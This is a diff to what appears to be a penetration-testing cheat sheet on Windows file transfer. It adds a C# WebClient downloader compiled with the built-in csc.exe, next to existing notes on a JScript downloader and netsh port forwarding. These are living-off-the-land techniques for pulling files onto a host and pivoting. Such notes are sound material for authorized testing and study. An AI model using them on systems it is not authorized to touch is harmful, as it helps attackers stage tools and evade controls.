@@ -741,7 +741,7 @@ Remove port forwarding rule.
 
 `netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0`
 
-## >> Downloading files with Javascript
+## >> Downloading files with compiled Javascript
 
 First, as administrator, register the System .NET assembly.
 
@@ -761,3 +761,31 @@ Compile dl.js into an exe.
 `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe dl.js`
 
 Now execute `dl.exe` to retrieve the file.
+
+## Downloading files with compiled C#
+
+Create csharp file, dl.cs.
+
+```
+using System.Net;
+
+namespace dlfile
+{
+   class dl
+   {
+      static void Main()
+      {
+         string URL = "http://download.domain.com/file.bin";
+         string FilePath = "C:\\folder\\file.bin";
+         WebClient WC = new WebClient();
+         WC.DownloadFile(URL, FilePath);
+      }
+   }
+}
+```
+
+Compile the program.
+
+`c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:c:\folder\dl.exe c:\folder\dl.cs`
+
+Execute `dl.exe` to retrieve the file.
